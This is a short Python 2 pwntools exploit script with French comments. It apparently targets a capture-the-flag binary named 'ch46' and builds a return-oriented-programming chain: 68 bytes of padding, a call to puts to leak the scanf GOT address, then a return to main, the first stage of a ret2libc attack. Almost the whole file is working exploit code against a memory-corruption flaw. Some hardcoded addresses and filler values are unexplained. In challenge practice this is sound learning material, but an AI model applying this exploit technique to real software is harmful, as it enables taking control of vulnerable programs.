#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *


p = 0
#b = ELF('./ch46')
#libc = ELF('/lib32/libc.so.6') # "info sharedlibrary" sous gdb pour connaître le chemin de votre libc

# pwntools permet de récupérer les adresses directement dans le binaire sans avoir à les chercher via objdump :
#addrmain = b.symbols['main'] # 0x8048477
addrmain = 0x00010638
pr = 0x0001055c  #: pop ebx ; ret
#gotscanf = b.symbols['got.__isoc99_scanf'] # 0x804975c
gotscanf = p32(0x00020ff4)
#pltputs = b.symbols['puts'] # 0x8048310 
pltputs = p32(0x000105cc)
padding="A"*68
yak = p32(0x000105b0)

print gotscanf
print pltputs

ropchain=padding+yak+'TTTT'+'HHHH'+pltputs+p32(pr)+gotscanf+p32(addrmain) # p32 permet de "pack" une adresse : 0x61616161 -> "aaaa" 

print ropchain
